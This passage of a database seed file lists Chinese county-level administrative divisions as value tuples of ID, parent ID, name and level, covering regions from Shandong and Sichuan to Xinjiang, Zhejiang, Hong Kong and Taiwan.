281,'泽库县',3),(2325,281,'河南蒙古族自治县',3),(2326,282,'玉树县',3),(2327,282,'杂多县',3),(2328,282,'称多县',3),(2329,282,'治多县',3),(2330,282,'囊谦县',3),(2331,282,'曲麻莱县',3),(2332,283,'市中区',3),(2333,283,'历下区',3),(2334,283,'天桥区',3),(2335,283,'槐荫区',3),(2336,283,'历城区',3),(2337,283,'长清区',3),(2338,283,'章丘市',3),(2339,283,'平阴县',3),(2340,283,'济阳县',3),(2341,283,'商河县',3),(2342,284,'市南区',3),(2343,284,'市北区',3),(2344,284,'城阳区',3),(2345,284,'四方区',3),(2346,284,'李沧区',3),(2347,284,'黄岛区',3),(2348,284,'崂山区',3),(2349,284,'胶州市',3),(2350,284,'即墨市',3),(2351,284,'平度市',3),(2352,284,'胶南市',3),(2353,284,'莱西市',3),(2354,285,'滨城区',3),(2355,285,'惠民县',3),(2356,285,'阳信县',3),(2357,285,'无棣县',3),(2358,285,'沾化县',3),(2359,285,'博兴县',3),(2360,285,'邹平县',3),(2361,286,'德城区',3),(2362,286,'陵县',3),(2363,286,'乐陵市',3),(2364,286,'禹城市',3),(2365,286,'宁津县',3),(2366,286,'庆云县',3),(2367,286,'临邑县',3),(2368,286,'齐河县',3),(2369,286,'平原县',3),(2370,286,'夏津县',3),(2371,286,'武城县',3),(2372,287,'东营区',3),(2373,287,'河口区',3),(2374,287,'垦利县',3),(2375,287,'利津县',3),(2376,287,'广饶县',3),(2377,288,'牡丹区',3),(2378,288,'曹县',3),(2379,288,'单县',3),(2380,288,'成武县',3),(2381,288,'巨野县',3),(2382,288,'郓城县',3),(2383,288,'鄄城县',3),(2384,288,'定陶县',3),(2385,288,'东明县',3),(2386,289,'市中区',3),(2387,289,'任城区',3),(2388,289,'曲阜市',3),(2389,289,'兖州市',3),(2390,289,'邹城市',3),(2391,289,'微山县',3),(2392,289,'鱼台县',3),(2393,289,'金乡县',3),(2394,289,'嘉祥县',3),(2395,289,'汶上县',3),(2396,289,'泗水县',3),(2397,289,'梁山县',3),(2398,290,'莱城区',3),(2399,290,'钢城区',3),(2400,291,'东昌府区',3),(2401,291,'临清市',3),(2402,291,'阳谷县',3),(2403,291,'莘县',3),(2404,291,'茌平县',3),(2405,291,'东阿县',3),(2406,291,'冠县',3),(2407,291,'高唐县',3),(2408,292,'兰山区',3),(2409,292,'罗庄区',3),(2410,292,'河东区',3),(2411,292,'沂南县',3),(2412,292,'郯城县',3),(2413,292,'沂水县',3),(2414,292,'苍山县',3),(2415,292,'费县',3),(2416,292,'平邑县',3),(2417,292,'莒南县',3),(2418,292,'蒙阴县',3),(2419,292,'临沭县',3),(2420,293,'东港区',3),(2421,293,'岚山区',3),(2422,293,'五莲县',3),(2423,293,'莒县',3),(2424,294,'泰山区',3),(2425,294,'岱岳区',3),(2426,294,'新泰市',3),(2427,294,'肥城市',3),(2428,294,'宁阳县',3),(2429,294,'东平县',3),(2430,295,'荣成市',3),(2431,295,'乳山市',3),(2432,295,'环翠区',3),(2433,295,'文登市',3),(2434,296,'潍城区',3),(2435,296,'寒亭区',3),(2436,296,'坊子区',3),(2437,296,'奎文区',3),(2438,296,'青州市',3),(2439,296,'诸城市',3),(2440,296,'寿光市',3),(2441,296,'安丘市',3),(2442,296,'高密市',3),(2443,296,'昌邑市',3),(2444,296,'临朐县',3),(2445,296,'昌乐县',3),(2446,297,'芝罘区',3),(2447,297,'福山区',3),(2448,297,'牟平区',3),(2449,297,'莱山区',3),(2450,297,'开发区',3),(2451,297,'龙口市',3),(2452,297,'莱阳市',3),(2453,297,'莱州市',3),(2454,297,'蓬莱市',3),(2455,297,'招远市',3),(2456,297,'栖霞市',3),(2457,297,'海阳市',3),(2458,297,'长岛县',3),(2459,298,'市中区',3),(2460,298,'山亭区',3),(2461,298,'峄城区',3),(2462,298,'台儿庄区',3),(2463,298,'薛城区',3),(2464,298,'滕州市',3),(2465,299,'张店区',3),(2466,299,'临淄区',3),(2467,299,'淄川区',3),(2468,299,'博山区',3),(2469,299,'周村区',3),(2470,299,'桓台县',3),(2471,299,'高青县',3),(2472,299,'沂源县',3),(2473,300,'杏花岭区',3),(2474,300,'小店区',3),(2475,300,'迎泽区',3),(2476,300,'尖草坪区',3),(2477,300,'万柏林区',3),(2478,300,'晋源区',3),(2479,300,'高新开发区',3),(2480,300,'民营经济开发区',3),(2481,300,'经济技术开发区',3),(2482,300,'清徐县',3),(2483,300,'阳曲县',3),(2484,300,'娄烦县',3),(2485,300,'古交市',3),(2486,301,'城区',3),(2487,301,'郊区',3),(2488,301,'沁县',3),(2489,301,'潞城市',3),(2490,301,'长治县',3),(2491,301,'襄垣县',3),(2492,301,'屯留县',3),(2493,301,'平顺县',3),(2494,301,'黎城县',3),(2495,301,'壶关县',3),(2496,301,'长子县',3),(2497,301,'武乡县',3),(2498,301,'沁源县',3),(2499,302,'城区',3),(2500,302,'矿区',3),(2501,302,'南郊区',3),(2502,302,'新荣区',3),(2503,302,'阳高县',3),(2504,302,'天镇县',3),(2505,302,'广灵县',3),(2506,302,'灵丘县',3),(2507,302,'浑源县',3),(2508,302,'左云县',3),(2509,302,'大同县',3),(2510,303,'城区',3),(2511,303,'高平市',3),(2512,303,'沁水县',3),(2513,303,'阳城县',3),(2514,303,'陵川县',3),(2515,303,'泽州县',3),(2516,304,'榆次区',3),(2517,304,'介休市',3),(2518,304,'榆社县',3),(2519,304,'左权县',3),(2520,304,'和顺县',3),(2521,304,'昔阳县',3),(2522,304,'寿阳县',3),(2523,304,'太谷县',3),(2524,304,'祁县',3),(2525,304,'平遥县',3),(2526,304,'灵石县',3),(2527,305,'尧都区',3),(2528,305,'侯马市',3),(2529,305,'霍州市',3),(2530,305,'曲沃县',3),(2531,305,'翼城县',3),(2532,305,'襄汾县',3),(2533,305,'洪洞县',3),(2534,305,'吉县',3),(2535,305,'安泽县',3),(2536,305,'浮山县',3),(2537,305,'古县',3),(2538,305,'乡宁县',3),(2539,305,'大宁县',3),(2540,305,'隰县',3),(2541,305,'永和县',3),(2542,305,'蒲县',3),(2543,305,'汾西县',3),(2544,306,'离石市',3),(2545,306,'离石区',3),(2546,306,'孝义市',3),(2547,306,'汾阳市',3),(2548,306,'文水县',3),(2549,306,'交城县',3),(2550,306,'兴县',3),(2551,306,'临县',3),(2552,306,'柳林县',3),(2553,306,'石楼县',3),(2554,306,'岚县',3),(2555,306,'方山县',3),(2556,306,'中阳县',3),(2557,306,'交口县',3),(2558,307,'朔城区',3),(2559,307,'平鲁区',3),(2560,307,'山阴县',3),(2561,307,'应县',3),(2562,307,'右玉县',3),(2563,307,'怀仁县',3),(2564,308,'忻府区',3),(2565,308,'原平市',3),(2566,308,'定襄县',3),(2567,308,'五台县',3),(2568,308,'代县',3),(2569,308,'繁峙县',3),(2570,308,'宁武县',3),(2571,308,'静乐县',3),(2572,308,'神池县',3),(2573,308,'五寨县',3),(2574,308,'岢岚县',3),(2575,308,'河曲县',3),(2576,308,'保德县',3),(2577,308,'偏关县',3),(2578,309,'城区',3),(2579,309,'矿区',3),(2580,309,'郊区',3),(2581,309,'平定县',3),(2582,309,'盂县',3),(2583,310,'盐湖区',3),(2584,310,'永济市',3),(2585,310,'河津市',3),(2586,310,'临猗县',3),(2587,310,'万荣县',3),(2588,310,'闻喜县',3),(2589,310,'稷山县',3),(2590,310,'新绛县',3),(2591,310,'绛县',3),(2592,310,'垣曲县',3),(2593,310,'夏县',3),(2594,310,'平陆县',3),(2595,310,'芮城县',3),(2596,311,'莲湖区',3),(2597,311,'新城区',3),(2598,311,'碑林区',3),(2599,311,'雁塔区',3),(2600,311,'灞桥区',3),(2601,311,'未央区',3),(2602,311,'阎良区',3),(2603,311,'临潼区',3),(2604,311,'长安区',3),(2605,311,'蓝田县',3),(2606,311,'周至县',3),(2607,311,'户县',3),(2608,311,'高陵县',3),(2609,312,'汉滨区',3),(2610,312,'汉阴县',3),(2611,312,'石泉县',3),(2612,312,'宁陕县',3),(2613,312,'紫阳县',3),(2614,312,'岚皋县',3),(2615,312,'平利县',3),(2616,312,'镇坪县',3),(2617,312,'旬阳县',3),(2618,312,'白河县',3),(2619,313,'陈仓区',3),(2620,313,'渭滨区',3),(2621,313,'金台区',3),(2622,313,'凤翔县',3),(2623,313,'岐山县',3),(2624,313,'扶风县',3),(2625,313,'眉县',3),(2626,313,'陇县',3),(2627,313,'千阳县',3),(2628,313,'麟游县',3),(2629,313,'凤县',3),(2630,313,'太白县',3),(2631,314,'汉台区',3),(2632,314,'南郑县',3),(2633,314,'城固县',3),(2634,314,'洋县',3),(2635,314,'西乡县',3),(2636,314,'勉县',3),(2637,314,'宁强县',3),(2638,314,'略阳县',3),(2639,314,'镇巴县',3),(2640,314,'留坝县',3),(2641,314,'佛坪县',3),(2642,315,'商州区',3),(2643,315,'洛南县',3),(2644,315,'丹凤县',3),(2645,315,'商南县',3),(2646,315,'山阳县',3),(2647,315,'镇安县',3),(2648,315,'柞水县',3),(2649,316,'耀州区',3),(2650,316,'王益区',3),(2651,316,'印台区',3),(2652,316,'宜君县',3),(2653,317,'临渭区',3),(2654,317,'韩城市',3),(2655,317,'华阴市',3),(2656,317,'华县',3),(2657,317,'潼关县',3),(2658,317,'大荔县',3),(2659,317,'合阳县',3),(2660,317,'澄城县',3),(2661,317,'蒲城县',3),(2662,317,'白水县',3),(2663,317,'富平县',3),(2664,318,'秦都区',3),(2665,318,'渭城区',3),(2666,318,'杨陵区',3),(2667,318,'兴平市',3),(2668,318,'三原县',3),(2669,318,'泾阳县',3),(2670,318,'乾县',3),(2671,318,'礼泉县',3),(2672,318,'永寿县',3),(2673,318,'彬县',3),(2674,318,'长武县',3),(2675,318,'旬邑县',3),(2676,318,'淳化县',3),(2677,318,'武功县',3),(2678,319,'吴起县',3),(2679,319,'宝塔区',3),(2680,319,'延长县',3),(2681,319,'延川县',3),(2682,319,'子长县',3),(2683,319,'安塞县',3),(2684,319,'志丹县',3),(2685,319,'甘泉县',3),(2686,319,'富县',3),(2687,319,'洛川县',3),(2688,319,'宜川县',3),(2689,319,'黄龙县',3),(2690,319,'黄陵县',3),(2691,320,'榆阳区',3),(2692,320,'神木县',3),(2693,320,'府谷县',3),(2694,320,'横山县',3),(2695,320,'靖边县',3),(2696,320,'定边县',3),(2697,320,'绥德县',3),(2698,320,'米脂县',3),(2699,320,'佳县',3),(2700,320,'吴堡县',3),(2701,320,'清涧县',3),(2702,320,'子洲县',3),(2703,321,'长宁区',3),(2704,321,'闸北区',3),(2705,321,'闵行区',3),(2706,321,'徐汇区',3),(2707,321,'浦东新区',3),(2708,321,'杨浦区',3),(2709,321,'普陀区',3),(2710,321,'静安区',3),(2711,321,'卢湾区',3),(2712,321,'虹口区',3),(2713,321,'黄浦区',3),(2714,321,'南汇区',3),(2715,321,'松江区',3),(2716,321,'嘉定区',3),(2717,321,'宝山区',3),(2718,321,'青浦区',3),(2719,321,'金山区',3),(2720,321,'奉贤区',3),(2721,321,'崇明县',3),(2722,322,'青羊区',3),(2723,322,'锦江区',3),(2724,322,'金牛区',3),(2725,322,'武侯区',3),(2726,322,'成华区',3),(2727,322,'龙泉驿区',3),(2728,322,'青白江区',3),(2729,322,'新都区',3),(2730,322,'温江区',3),(2731,322,'高新区',3),(2732,322,'高新西区',3),(2733,322,'都江堰市',3),(2734,322,'彭州市',3),(2735,322,'邛崃市',3),(2736,322,'崇州市',3),(2737,322,'金堂县',3),(2738,322,'双流县',3),(2739,322,'郫县',3),(2740,322,'大邑县',3),(2741,322,'蒲江县',3),(2742,322,'新津县',3),(2743,322,'都江堰市',3),(2744,322,'彭州市',3),(2745,322,'邛崃市',3),(2746,322,'崇州市',3),(2747,322,'金堂县',3),(2748,322,'双流县',3),(2749,322,'郫县',3),(2750,322,'大邑县',3),(2751,322,'蒲江县',3),(2752,322,'新津县',3),(2753,323,'涪城区',3),(2754,323,'游仙区',3),(2755,323,'江油市',3),(2756,323,'盐亭县',3),(2757,323,'三台县',3),(2758,323,'平武县',3),(2759,323,'安县',3),(2760,323,'梓潼县',3),(2761,323,'北川县',3),(2762,324,'马尔康县',3),(2763,324,'汶川县',3),(2764,324,'理县',3),(2765,324,'茂县',3),(2766,324,'松潘县',3),(2767,324,'九寨沟县',3),(2768,324,'金川县',3),(2769,324,'小金县',3),(2770,324,'黑水县',3),(2771,324,'壤塘县',3),(2772,324,'阿坝县',3),(2773,324,'若尔盖县',3),(2774,324,'红原县',3),(2775,325,'巴州区',3),(2776,325,'通江县',3),(2777,325,'南江县',3),(2778,325,'平昌县',3),(2779,326,'通川区',3),(2780,326,'万源市',3),(2781,326,'达县',3),(2782,326,'宣汉县',3),(2783,326,'开江县',3),(2784,326,'大竹县',3),(2785,326,'渠县',3),(2786,327,'旌阳区',3),(2787,327,'广汉市',3),(2788,327,'什邡市',3),(2789,327,'绵竹市',3),(2790,327,'罗江县',3),(2791,327,'中江县',3),(2792,328,'康定县',3),(2793,328,'丹巴县',3),(2794,328,'泸定县',3),(2795,328,'炉霍县',3),(2796,328,'九龙县',3),(2797,328,'甘孜县',3),(2798,328,'雅江县',3),(2799,328,'新龙县',3),(2800,328,'道孚县',3),(2801,328,'白玉县',3),(2802,328,'理塘县',3),(2803,328,'德格县',3),(2804,328,'乡城县',3),(2805,328,'石渠县',3),(2806,328,'稻城县',3),(2807,328,'色达县',3),(2808,328,'巴塘县',3),(2809,328,'得荣县',3),(2810,329,'广安区',3),(2811,329,'华蓥市',3),(2812,329,'岳池县',3),(2813,329,'武胜县',3),(2814,329,'邻水县',3),(2815,330,'利州区',3),(2816,330,'元坝区',3),(2817,330,'朝天区',3),(2818,330,'旺苍县',3),(2819,330,'青川县',3),(2820,330,'剑阁县',3),(2821,330,'苍溪县',3),(2822,331,'峨眉山市',3),(2823,331,'乐山市',3),(2824,331,'犍为县',3),(2825,331,'井研县',3),(2826,331,'夹江县',3),(2827,331,'沐川县',3),(2828,331,'峨边',3),(2829,331,'马边',3),(2830,332,'西昌市',3),(2831,332,'盐源县',3),(2832,332,'德昌县',3),(2833,332,'会理县',3),(2834,332,'会东县',3),(2835,332,'宁南县',3),(2836,332,'普格县',3),(2837,332,'布拖县',3),(2838,332,'金阳县',3),(2839,332,'昭觉县',3),(2840,332,'喜德县',3),(2841,332,'冕宁县',3),(2842,332,'越西县',3),(2843,332,'甘洛县',3),(2844,332,'美姑县',3),(2845,332,'雷波县',3),(2846,332,'木里',3),(2847,333,'东坡区',3),(2848,333,'仁寿县',3),(2849,333,'彭山县',3),(2850,333,'洪雅县',3),(2851,333,'丹棱县',3),(2852,333,'青神县',3),(2853,334,'阆中市',3),(2854,334,'南部县',3),(2855,334,'营山县',3),(2856,334,'蓬安县',3),(2857,334,'仪陇县',3),(2858,334,'顺庆区',3),(2859,334,'高坪区',3),(2860,334,'嘉陵区',3),(2861,334,'西充县',3),(2862,335,'市中区',3),(2863,335,'东兴区',3),(2864,335,'威远县',3),(2865,335,'资中县',3),(2866,335,'隆昌县',3),(2867,336,'东  区',3),(2868,336,'西  区',3),(2869,336,'仁和区',3),(2870,336,'米易县',3),(2871,336,'盐边县',3),(2872,337,'船山区',3),(2873,337,'安居区',3),(2874,337,'蓬溪县',3),(2875,337,'射洪县',3),(2876,337,'大英县',3),(2877,338,'雨城区',3),(2878,338,'名山县',3),(2879,338,'荥经县',3),(2880,338,'汉源县',3),(2881,338,'石棉县',3),(2882,338,'天全县',3),(2883,338,'芦山县',3),(2884,338,'宝兴县',3),(2885,339,'翠屏区',3),(2886,339,'宜宾县',3),(2887,339,'南溪县',3),(2888,339,'江安县',3),(2889,339,'长宁县',3),(2890,339,'高县',3),(2891,339,'珙县',3),(2892,339,'筠连县',3),(2893,339,'兴文县',3),(2894,339,'屏山县',3),(2895,340,'雁江区',3),(2896,340,'简阳市',3),(2897,340,'安岳县',3),(2898,340,'乐至县',3),(2899,341,'大安区',3),(2900,341,'自流井区',3),(2901,341,'贡井区',3),(2902,341,'沿滩区',3),(2903,341,'荣县',3),(2904,341,'富顺县',3),(2905,342,'江阳区',3),(2906,342,'纳溪区',3),(2907,342,'龙马潭区',3),(2908,342,'泸县',3),(2909,342,'合江县',3),(2910,342,'叙永县',3),(2911,342,'古蔺县',3),(2912,343,'和平区',3),(2913,343,'河西区',3),(2914,343,'南开区',3),(2915,343,'河北区',3),(2916,343,'河东区',3),(2917,343,'红桥区',3),(2918,343,'东丽区',3),(2919,343,'津南区',3),(2920,343,'西青区',3),(2921,343,'北辰区',3),(2922,343,'塘沽区',3),(2923,343,'汉沽区',3),(2924,343,'大港区',3),(2925,343,'武清区',3),(2926,343,'宝坻区',3),(2927,343,'经济开发区',3),(2928,343,'宁河县',3),(2929,343,'静海县',3),(2930,343,'蓟县',3),(2931,344,'城关区',3),(2932,344,'林周县',3),(2933,344,'当雄县',3),(2934,344,'尼木县',3),(2935,344,'曲水县',3),(2936,344,'堆龙德庆县',3),(2937,344,'达孜县',3),(2938,344,'墨竹工卡县',3),(2939,345,'噶尔县',3),(2940,345,'普兰县',3),(2941,345,'札达县',3),(2942,345,'日土县',3),(2943,345,'革吉县',3),(2944,345,'改则县',3),(2945,345,'措勤县',3),(2946,346,'昌都县',3),(2947,346,'江达县',3),(2948,346,'贡觉县',3),(2949,346,'类乌齐县',3),(2950,346,'丁青县',3),(2951,346,'察雅县',3),(2952,346,'八宿县',3),(2953,346,'左贡县',3),(2954,346,'芒康县',3),(2955,346,'洛隆县',3),(2956,346,'边坝县',3),(2957,347,'林芝县',3),(2958,347,'工布江达县',3),(2959,347,'米林县',3),(2960,347,'墨脱县',3),(2961,347,'波密县',3),(2962,347,'察隅县',3),(2963,347,'朗县',3),(2964,348,'那曲县',3),(2965,348,'嘉黎县',3),(2966,348,'比如县',3),(2967,348,'聂荣县',3),(2968,348,'安多县',3),(2969,348,'申扎县',3),(2970,348,'索县',3),(2971,348,'班戈县',3),(2972,348,'巴青县',3),(2973,348,'尼玛县',3),(2974,349,'日喀则市',3),(2975,349,'南木林县',3),(2976,349,'江孜县',3),(2977,349,'定日县',3),(2978,349,'萨迦县',3),(2979,349,'拉孜县',3),(2980,349,'昂仁县',3),(2981,349,'谢通门县',3),(2982,349,'白朗县',3),(2983,349,'仁布县',3),(2984,349,'康马县',3),(2985,349,'定结县',3),(2986,349,'仲巴县',3),(2987,349,'亚东县',3),(2988,349,'吉隆县',3),(2989,349,'聂拉木县',3),(2990,349,'萨嘎县',3),(2991,349,'岗巴县',3),(2992,350,'乃东县',3),(2993,350,'扎囊县',3),(2994,350,'贡嘎县',3),(2995,350,'桑日县',3),(2996,350,'琼结县',3),(2997,350,'曲松县',3),(2998,350,'措美县',3),(2999,350,'洛扎县',3),(3000,350,'加查县',3),(3001,350,'隆子县',3),(3002,350,'错那县',3),(3003,350,'浪卡子县',3),(3004,351,'天山区',3),(3005,351,'沙依巴克区',3),(3006,351,'新市区',3),(3007,351,'水磨沟区',3),(3008,351,'头屯河区',3),(3009,351,'达坂城区',3),(3010,351,'米东区',3),(3011,351,'乌鲁木齐县',3),(3012,352,'阿克苏市',3),(3013,352,'温宿县',3),(3014,352,'库车县',3),(3015,352,'沙雅县',3),(3016,352,'新和县',3),(3017,352,'拜城县',3),(3018,352,'乌什县',3),(3019,352,'阿瓦提县',3),(3020,352,'柯坪县',3),(3021,353,'阿拉尔市',3),(3022,354,'库尔勒市',3),(3023,354,'轮台县',3),(3024,354,'尉犁县',3),(3025,354,'若羌县',3),(3026,354,'且末县',3),(3027,354,'焉耆',3),(3028,354,'和静县',3),(3029,354,'和硕县',3),(3030,354,'博湖县',3),(3031,355,'博乐市',3),(3032,355,'精河县',3),(3033,355,'温泉县',3),(3034,356,'呼图壁县',3),(3035,356,'米泉市',3),(3036,356,'昌吉市',3),(3037,356,'阜康市',3),(3038,356,'玛纳斯县',3),(3039,356,'奇台县',3),(3040,356,'吉木萨尔县',3),(3041,356,'木垒',3),(3042,357,'哈密市',3),(3043,357,'伊吾县',3),(3044,357,'巴里坤',3),(3045,358,'和田市',3),(3046,358,'和田县',3),(3047,358,'墨玉县',3),(3048,358,'皮山县',3),(3049,358,'洛浦县',3),(3050,358,'策勒县',3),(3051,358,'于田县',3),(3052,358,'民丰县',3),(3053,359,'喀什市',3),(3054,359,'疏附县',3),(3055,359,'疏勒县',3),(3056,359,'英吉沙县',3),(3057,359,'泽普县',3),(3058,359,'莎车县',3),(3059,359,'叶城县',3),(3060,359,'麦盖提县',3),(3061,359,'岳普湖县',3),(3062,359,'伽师县',3),(3063,359,'巴楚县',3),(3064,359,'塔什库尔干',3),(3065,360,'克拉玛依市',3),(3066,361,'阿图什市',3),(3067,361,'阿克陶县',3),(3068,361,'阿合奇县',3),(3069,361,'乌恰县',3),(3070,362,'石河子市',3),(3071,363,'图木舒克市',3),(3072,364,'吐鲁番市',3),(3073,364,'鄯善县',3),(3074,364,'托克逊县',3),(3075,365,'五家渠市',3),(3076,366,'阿勒泰市',3),(3077,366,'布克赛尔',3),(3078,366,'伊宁市',3),(3079,366,'布尔津县',3),(3080,366,'奎屯市',3),(3081,366,'乌苏市',3),(3082,366,'额敏县',3),(3083,366,'富蕴县',3),(3084,366,'伊宁县',3),(3085,366,'福海县',3),(3086,366,'霍城县',3),(3087,366,'沙湾县',3),(3088,366,'巩留县',3),(3089,366,'哈巴河县',3),(3090,366,'托里县',3),(3091,366,'青河县',3),(3092,366,'新源县',3),(3093,366,'裕民县',3),(3094,366,'和布克赛尔',3),(3095,366,'吉木乃县',3),(3096,366,'昭苏县',3),(3097,366,'特克斯县',3),(3098,366,'尼勒克县',3),(3099,366,'察布查尔',3),(3100,367,'盘龙区',3),(3101,367,'五华区',3),(3102,367,'官渡区',3),(3103,367,'西山区',3),(3104,367,'东川区',3),(3105,367,'安宁市',3),(3106,367,'呈贡县',3),(3107,367,'晋宁县',3),(3108,367,'富民县',3),(3109,367,'宜良县',3),(3110,367,'嵩明县',3),(3111,367,'石林县',3),(3112,367,'禄劝',3),(3113,367,'寻甸',3),(3114,368,'兰坪',3),(3115,368,'泸水县',3),(3116,368,'福贡县',3),(3117,368,'贡山',3),(3118,369,'宁洱',3),(3119,369,'思茅区',3),(3120,369,'墨江',3),(3121,369,'景东',3),(3122,369,'景谷',3),(3123,369,'镇沅',3),(3124,369,'江城',3),(3125,369,'孟连',3),(3126,369,'澜沧',3),(3127,369,'西盟',3),(3128,370,'古城区',3),(3129,370,'宁蒗',3),(3130,370,'玉龙',3),(3131,370,'永胜县',3),(3132,370,'华坪县',3),(3133,371,'隆阳区',3),(3134,371,'施甸县',3),(3135,371,'腾冲县',3),(3136,371,'龙陵县',3),(3137,371,'昌宁县',3),(3138,372,'楚雄市',3),(3139,372,'双柏县',3),(3140,372,'牟定县',3),(3141,372,'南华县',3),(3142,372,'姚安县',3),(3143,372,'大姚县',3),(3144,372,'永仁县',3),(3145,372,'元谋县',3),(3146,372,'武定县',3),(3147,372,'禄丰县',3),(3148,373,'大理市',3),(3149,373,'祥云县',3),(3150,373,'宾川县',3),(3151,373,'弥渡县',3),(3152,373,'永平县',3),(3153,373,'云龙县',3),(3154,373,'洱源县',3),(3155,373,'剑川县',3),(3156,373,'鹤庆县',3),(3157,373,'漾濞',3),(3158,373,'南涧',3),(3159,373,'巍山',3),(3160,374,'潞西市',3),(3161,374,'瑞丽市',3),(3162,374,'梁河县',3),(3163,374,'盈江县',3),(3164,374,'陇川县',3),(3165,375,'香格里拉县',3),(3166,375,'德钦县',3),(3167,375,'维西',3),(3168,376,'泸西县',3),(3169,376,'蒙自县',3),(3170,376,'个旧市',3),(3171,376,'开远市',3),(3172,376,'绿春县',3),(3173,376,'建水县',3),(3174,376,'石屏县',3),(3175,376,'弥勒县',3),(3176,376,'元阳县',3),(3177,376,'红河县',3),(3178,376,'金平',3),(3179,376,'河口',3),(3180,376,'屏边',3),(3181,377,'临翔区',3),(3182,377,'凤庆县',3),(3183,377,'云县',3),(3184,377,'永德县',3),(3185,377,'镇康县',3),(3186,377,'双江',3),(3187,377,'耿马',3),(3188,377,'沧源',3),(3189,378,'麒麟区',3),(3190,378,'宣威市',3),(3191,378,'马龙县',3),(3192,378,'陆良县',3),(3193,378,'师宗县',3),(3194,378,'罗平县',3),(3195,378,'富源县',3),(3196,378,'会泽县',3),(3197,378,'沾益县',3),(3198,379,'文山县',3),(3199,379,'砚山县',3),(3200,379,'西畴县',3),(3201,379,'麻栗坡县',3),(3202,379,'马关县',3),(3203,379,'丘北县',3),(3204,379,'广南县',3),(3205,379,'富宁县',3),(3206,380,'景洪市',3),(3207,380,'勐海县',3),(3208,380,'勐腊县',3),(3209,381,'红塔区',3),(3210,381,'江川县',3),(3211,381,'澄江县',3),(3212,381,'通海县',3),(3213,381,'华宁县',3),(3214,381,'易门县',3),(3215,381,'峨山',3),(3216,381,'新平',3),(3217,381,'元江',3),(3218,382,'昭阳区',3),(3219,382,'鲁甸县',3),(3220,382,'巧家县',3),(3221,382,'盐津县',3),(3222,382,'大关县',3),(3223,382,'永善县',3),(3224,382,'绥江县',3),(3225,382,'镇雄县',3),(3226,382,'彝良县',3),(3227,382,'威信县',3),(3228,382,'水富县',3),(3229,383,'西湖区',3),(3230,383,'上城区',3),(3231,383,'下城区',3),(3232,383,'拱墅区',3),(3233,383,'滨江区',3),(3234,383,'江干区',3),(3235,383,'萧山区',3),(3236,383,'余杭区',3),(3237,383,'市郊',3),(3238,383,'建德市',3),(3239,383,'富阳市',3),(3240,383,'临安市',3),(3241,383,'桐庐县',3),(3242,383,'淳安县',3),(3243,384,'吴兴区',3),(3244,384,'南浔区',3),(3245,384,'德清县',3),(3246,384,'长兴县',3),(3247,384,'安吉县',3),(3248,385,'南湖区',3),(3249,385,'秀洲区',3),(3250,385,'海宁市',3),(3251,385,'嘉善县',3),(3252,385,'平湖市',3),(3253,385,'桐乡市',3),(3254,385,'海盐县',3),(3255,386,'婺城区',3),(3256,386,'金东区',3),(3257,386,'兰溪市',3),(3258,386,'市区',3),(3259,386,'佛堂镇',3),(3260,386,'上溪镇',3),(3261,386,'义亭镇',3),(3262,386,'大陈镇',3),(3263,386,'苏溪镇',3),(3264,386,'赤岸镇',3),(3265,386,'东阳市',3),(3266,386,'永康市',3),(3267,386,'武义县',3),(3268,386,'浦江县',3),(3269,386,'磐安县',3),(3270,387,'莲都区',3),(3271,387,'龙泉市',3),(3272,387,'青田县',3),(3273,387,'缙云县',3),(3274,387,'遂昌县',3),(3275,387,'松阳县',3),(3276,387,'云和县',3),(3277,387,'庆元县',3),(3278,387,'景宁',3),(3279,388,'海曙区',3),(3280,388,'江东区',3),(3281,388,'江北区',3),(3282,388,'镇海区',3),(3283,388,'北仑区',3),(3284,388,'鄞州区',3),(3285,388,'余姚市',3),(3286,388,'慈溪市',3),(3287,388,'奉化市',3),(3288,388,'象山县',3),(3289,388,'宁海县',3),(3290,389,'越城区',3),(3291,389,'上虞市',3),(3292,389,'嵊州市',3),(3293,389,'绍兴县',3),(3294,389,'新昌县',3),(3295,389,'诸暨市',3),(3296,390,'椒江区',3),(3297,390,'黄岩区',3),(3298,390,'路桥区',3),(3299,390,'温岭市',3),(3300,390,'临海市',3),(3301,390,'玉环县',3),(3302,390,'三门县',3),(3303,390,'天台县',3),(3304,390,'仙居县',3),(3305,391,'鹿城区',3),(3306,391,'龙湾区',3),(3307,391,'瓯海区',3),(3308,391,'瑞安市',3),(3309,391,'乐清市',3),(3310,391,'洞头县',3),(3311,391,'永嘉县',3),(3312,391,'平阳县',3),(3313,391,'苍南县',3),(3314,391,'文成县',3),(3315,391,'泰顺县',3),(3316,392,'定海区',3),(3317,392,'普陀区',3),(3318,392,'岱山县',3),(3319,392,'嵊泗县',3),(3320,393,'衢州市',3),(3321,393,'江山市',3),(3322,393,'常山县',3),(3323,393,'开化县',3),(3324,393,'龙游县',3),(3325,394,'合川区',3),(3326,394,'江津区',3),(3327,394,'南川区',3),(3328,394,'永川区',3),(3329,394,'南岸区',3),(3330,394,'渝北区',3),(3331,394,'万盛区',3),(3332,394,'大渡口区',3),(3333,394,'万州区',3),(3334,394,'北碚区',3),(3335,394,'沙坪坝区',3),(3336,394,'巴南区',3),(3337,394,'涪陵区',3),(3338,394,'江北区',3),(3339,394,'九龙坡区',3),(3340,394,'渝中区',3),(3341,394,'黔江开发区',3),(3342,394,'长寿区',3),(3343,394,'双桥区',3),(3344,394,'綦江县',3),(3345,394,'潼南县',3),(3346,394,'铜梁县',3),(3347,394,'大足县',3),(3348,394,'荣昌县',3),(3349,394,'璧山县',3),(3350,394,'垫江县',3),(3351,394,'武隆县',3),(3352,394,'丰都县',3),(3353,394,'城口县',3),(3354,394,'梁平县',3),(3355,394,'开县',3),(3356,394,'巫溪县',3),(3357,394,'巫山县',3),(3358,394,'奉节县',3),(3359,394,'云阳县',3),(3360,394,'忠县',3),(3361,394,'石柱',3),(3362,394,'彭水',3),(3363,394,'酉阳',3),(3364,394,'秀山',3),(3365,395,'沙田区',3),(3366,395,'东区',3),(3367,395,'观塘区',3),(3368,395,'黄大仙区',3),(3369,395,'九龙城区',3),(3370,395,'屯门区',3),(3371,395,'葵青区',3),(3372,395,'元朗区',3),(3373,395,'深水埗区',3),(3374,395,'西贡区',3),(3375,395,'大埔区',3),(3376,395,'湾仔区',3),(3377,395,'油尖旺区',3),(3378,395,'北区',3),(3379,395,'南区',3),(3380,395,'荃湾区',3),(3381,395,'中西区',3),(3382,395,'离岛区',3),(3383,396,'澳门',3),(3384,397,'台北',3),(3385,397,'高雄',3),(3386,397,'基隆',3),(3387,397,'台中',3),(3388,397,'台南',3),(3389,397,'新竹',3),(3390,397,'嘉义',3),(3391,397,'宜兰县',3),(3392,397,'桃园县',3),(3393,397,'苗栗县',3),(3394,397,'彰化县',3),(3395,397